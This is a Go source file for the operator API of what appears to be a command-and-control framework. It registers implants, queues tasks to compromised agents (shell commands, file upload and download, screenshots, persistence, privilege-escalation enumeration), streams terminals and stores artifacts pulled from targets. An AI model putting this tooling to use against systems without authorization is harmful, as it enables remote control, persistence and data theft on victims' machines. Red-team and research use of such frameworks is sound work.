package api

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"net/http"
	"regexp"
	"strings"

	"github.com/aelder202/sable/internal/protocol"
	"github.com/aelder202/sable/internal/session"
	"github.com/google/uuid"
)

// agentIDRe restricts agent IDs to URL-safe alphanumeric+hyphen strings to prevent
// path traversal, header injection, and other misuse when IDs appear in URLs.
var agentIDRe = regexp.MustCompile(`^[a-zA-Z0-9\-]{1,64}$`)

// Config holds operator API configuration.
type Config struct {
	OperatorPasswordHash *PasswordHash
	JWTSecret            []byte
}

const (
	maxRegisterBodyBytes   = 1024
	maxTaskBodyBytes       = maxUploadTaskPayloadBytes + 1024
	maxArtifactBodyBytes   = 75 * 1024 * 1024
	maxDNSTaskPayloadBytes = 8 * 1024
)

// Router is the operator-facing HTTP handler with security middleware applied.
type Router struct {
	mux *http.ServeMux
}

// NewRouter wires up all operator API routes with auth and security headers.
func NewRouter(store *session.Store, cfg *Config) *Router {
	mux := http.NewServeMux()
	rl := newRateLimiter()
	auth := requireJWT(cfg.JWTSecret)

	mux.HandleFunc("/api/auth/login", limitLogin(rl, loginHandler(cfg)))
	mux.Handle("/api/audit", auth(http.HandlerFunc(auditHandler(store))))
	mux.Handle("/api/agents", auth(http.HandlerFunc(agentsCollectionHandler(store))))
	mux.Handle("/api/agents/", auth(http.HandlerFunc(agentRouter(store))))

	r := &Router{mux: mux}
	return r
}

// ServeHTTP applies security headers to all responses.
func (r *Router) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	WithSecurityHeaders(r.mux).ServeHTTP(w, req)
}

// agentsCollectionHandler handles GET /api/agents (list) and POST /api/agents (register).
func agentsCollectionHandler(store *session.Store) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			agents := store.List()
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(agents) //nolint:errcheck
		case http.MethodPost:
			registerAgentHandler(store, w, r)
		default:
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		}
	}
}

// registerAgentHandler pre-registers an agent session so it can begin beaconing.
// The operator must call this before deploying an implant built with the same
// agent ID and secret. Request body: {"id": "<uuid>", "secret_hex": "<64-hex-chars>"}.
func registerAgentHandler(store *session.Store, w http.ResponseWriter, r *http.Request) {
	var req struct {
		ID        string `json:"id"`
		SecretHex string `json:"secret_hex"`
	}
	if !decodeJSONBody(w, r, &req, maxRegisterBodyBytes) {
		return
	}
	if req.ID == "" || req.SecretHex == "" {
		http.Error(w, "id and secret_hex required", http.StatusBadRequest)
		return
	}
	if !agentIDRe.MatchString(req.ID) {
		http.Error(w, "id must be 1-64 alphanumeric or hyphen characters", http.StatusBadRequest)
		return
	}
	secret, err := hex.DecodeString(req.SecretHex)
	if err != nil || len(secret) != 32 {
		http.Error(w, "secret_hex must be 64 hex characters (32 bytes)", http.StatusBadRequest)
		return
	}
	store.Register(&session.Agent{
		ID:     req.ID,
		Secret: secret,
	})
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(map[string]string{"id": req.ID}) //nolint:errcheck
}

func agentRouter(store *session.Store) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		// Path: /api/agents/<id>[/task|/tasks]
		parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/agents/"), "/")
		if len(parts) == 0 || parts[0] == "" {
			http.NotFound(w, r)
			return
		}
		agentID := parts[0]
		if !agentIDRe.MatchString(agentID) {
			http.NotFound(w, r)
			return
		}
		agent, ok := store.Get(agentID)
		if !ok {
			http.NotFound(w, r)
			return
		}
		if len(parts) == 1 {
			if r.Method != http.MethodGet {
				http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
				return
			}
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(agent) //nolint:errcheck
			return
		}
		switch parts[1] {
		case "task":
			queueTaskHandler(store, agentID)(w, r)
		case "tasks":
			if len(parts) == 2 {
				taskOutputsHandler(store, agentID)(w, r)
			} else if len(parts) == 3 {
				deleteQueuedTaskHandler(store, agentID, parts[2])(w, r)
			} else {
				http.NotFound(w, r)
			}
		case "queued":
			getQueuedTasksHandler(store, agentID)(w, r)
		case "metadata":
			updateAgentMetadataHandler(store, agentID)(w, r)
		case "artifacts":
			if len(parts) == 2 {
				artifactsHandler(store, agentID)(w, r)
			} else if len(parts) == 3 {
				getArtifactHandler(store, agentID, parts[2])(w, r)
			} else {
				http.NotFound(w, r)
			}
		case "terminal":
			if len(parts) > 2 && parts[2] == "stream" {
				terminalStreamHandler(store, agentID)(w, r)
			} else {
				http.NotFound(w, r)
			}
		default:
			http.NotFound(w, r)
		}
	}
}

func queueTaskHandler(store *session.Store, agentID string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		var req struct {
			Type    string `json:"type"`
			Payload string `json:"payload"`
		}
		if !decodeJSONBody(w, r, &req, maxTaskBodyBytes) {
			return
		}
		if len(req.Payload) > maxTaskPayloadBytes(req.Type) {
			http.Error(w, req.Type+" payload too large", http.StatusRequestEntityTooLarge)
			return
		}
		allowed := map[string]bool{
			"shell": true, "upload": true, "download": true,
			"sleep": true, "kill": true, "interactive": true,
			"complete": true, "pathbrowse": true,
			"ps": true, "screenshot": true, "persistence": true, "peas": true,
			"snapshot": true, "cancel": true, "ls": true,
		}
		if !allowed[req.Type] {
			http.Error(w, "invalid task type", http.StatusBadRequest)
			return
		}
		if err := validateTaskRequest(req.Type, req.Payload); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		if taskTooLargeForAgentTransport(store, agentID, req.Type, req.Payload) {
			http.Error(w, "upload payload too large for DNS transport; reconnect the agent over HTTPS before queueing large uploads", http.StatusBadRequest)
			return
		}
		task := &protocol.Task{
			ID:      uuid.New().String(),
			Type:    req.Type,
			Payload: normalizeTaskPayload(req.Type, req.Payload),
		}
		if err := store.EnqueueTask(agentID, task); err != nil {
			http.Error(w, err.Error(), http.StatusTooManyRequests)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"task_id": task.ID}) //nolint:errcheck
	}
}

func taskTooLargeForAgentTransport(store *session.Store, agentID, taskType, payload string) bool {
	if taskType != "upload" || len(payload) <= maxDNSTaskPayloadBytes {
		return false
	}
	agent, ok := store.Get(agentID)
	return ok && agent.Transport == "dns"
}

func auditHandler(store *session.Store) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodGet {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(store.AuditLog()) //nolint:errcheck
	}
}

// taskOutputsHandler returns or clears the task output history for a given agent.
func taskOutputsHandler(store *session.Store, agentID string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			outputs := store.GetOutputs(agentID)
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(outputs) //nolint:errcheck
		case http.MethodDelete:
			if !store.ClearOutputs(agentID) {
				http.NotFound(w, r)
				return
			}
			w.WriteHeader(http.StatusNoContent)
		default:
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		}
	}
}

func getQueuedTasksHandler(store *session.Store, agentID string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodGet {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(store.GetQueuedTasks(agentID)) //nolint:errcheck
	}
}

func deleteQueuedTaskHandler(store *session.Store, agentID, taskID string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodDelete {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		if taskID == "" || len(taskID) > 64 {
			http.Error(w, "invalid task id", http.StatusBadRequest)
			return
		}
		if !store.RemoveQueuedTask(agentID, taskID) {
			http.NotFound(w, r)
			return
		}
		w.WriteHeader(http.StatusNoContent)
	}
}

func updateAgentMetadataHandler(store *session.Store, agentID string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPut {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		var req struct {
			Notes string   `json:"notes"`
			Tags  []string `json:"tags"`
		}
		if !decodeJSONBody(w, r, &req, maxTaskBodyBytes) {
			return
		}
		if len(req.Notes) > 4096 || len(req.Tags) > 32 {
			http.Error(w, "metadata too large", http.StatusBadRequest)
			return
		}
		agent, ok := store.UpdateMetadata(agentID, req.Notes, req.Tags)
		if !ok {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(agent) //nolint:errcheck
	}
}

func artifactsHandler(store *session.Store, agentID string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(store.ListArtifacts(agentID)) //nolint:errcheck
		case http.MethodPost:
			createArtifactHandler(store, agentID, w, r)
		default:
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		}
	}
}

func createArtifactHandler(store *session.Store, agentID string, w http.ResponseWriter, r *http.Request) {
	var req session.Artifact
	if !decodeJSONBody(w, r, &req, maxArtifactBodyBytes) {
		return
	}
	if req.ID == "" {
		req.ID = uuid.New().String()
	}
	if !agentIDRe.MatchString(req.ID) {
		http.Error(w, "artifact id must be 1-64 alphanumeric or hyphen characters", http.StatusBadRequest)
		return
	}
	if err := validateArtifact(req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	artifact, ok := store.AddArtifact(agentID, req)
	if !ok {
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(artifact) //nolint:errcheck
}

func getArtifactHandler(store *session.Store, agentID, artifactID string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodGet {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		if !agentIDRe.MatchString(artifactID) {
			http.NotFound(w, r)
			return
		}
		artifact, ok := store.GetArtifact(agentID, artifactID)
		if !ok {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(artifact) //nolint:errcheck
	}
}

func validateArtifact(artifact session.Artifact) error {
	if strings.TrimSpace(artifact.Filename) == "" || len(artifact.Filename) > 240 {
		return errors.New("artifact filename required")
	}
	if len(artifact.ArchiveFilename) > 240 || len(artifact.MIME) > 128 || len(artifact.Label) > 128 || len(artifact.Key) > 256 {
		return errors.New("artifact metadata too large")
	}
	if artifact.Data == "" {
		return errors.New("artifact data required")
	}
	if _, err := base64.StdEncoding.DecodeString(artifact.Data); err != nil {
		return errors.New("artifact data must be valid base64")
	}
	return nil
}
